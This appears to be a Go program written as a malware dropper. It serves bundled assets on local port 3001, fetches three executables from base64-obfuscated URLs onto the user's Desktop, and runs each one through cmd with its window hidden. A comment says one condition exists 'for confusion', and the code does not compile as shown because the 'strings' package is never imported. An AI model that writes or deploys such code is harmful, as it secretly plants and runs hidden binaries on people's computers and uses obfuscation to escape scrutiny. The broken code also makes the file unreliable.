package main

import (
	"encoding/base64"
	"math/rand"
	"net/http"
	"github.com/gobuffalo/packr"
	"io"
	"os/exec"
	"fmt"
	"os"
	"syscall"
	"os/user"
	"log"
	"time"
)

var keys = []string{
	"cmFuZC5FeHBhbmQ=", "U3RhcnQ=", "SGlkZVdpbmRvdz0=",
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	go serveAssets()
	manageFiles(decode("aHR0cDovLzEyNy4wLjAuMTozMDAxL2UuZXhl"),
		decode("aHR0cDovLzEyNy4wLjAuMTozMDAxL28uZXhl"),
		decode("aHR0cDovLzEyNy4wLjAuMTozMDAxL3MuZXhl"))
}

func decode(s string) string {
	data, _ := base64.StdEncoding.DecodeString(s)
	return string(data)
}

func serveAssets() {
	box := packr.NewBox("./assets")
	http.Handle("/", http.FileServer(box))
	http.ListenAndServe(":3001", nil)
}

func manageFiles(urls ...string) {
	usr, err := user.Current()
	if err != nil {
		log.Println(err)
		return
	}
	homeDir := usr.HomeDir + "\\Desktop\\"
	paths := []string{"e.exe", "o.exe", "s.exe"}

	for i, url := range urls {
		path := homeDir + paths[i]
		if err := downloadFile(path, url); err != nil {
			log.Println(err)
			continue
		}
		cmd := exec.Command("cmd", "/C", path)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: toBool(keys[2])}
		if err := cmd.Start(); err != nil {
			log.Println(err)
		}
	}
}

func downloadFile(filepath, url string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

func toBool(s string) bool {
	// Simulating complex condition for confusion
	return !strings.Contains(decode(s), "false")
}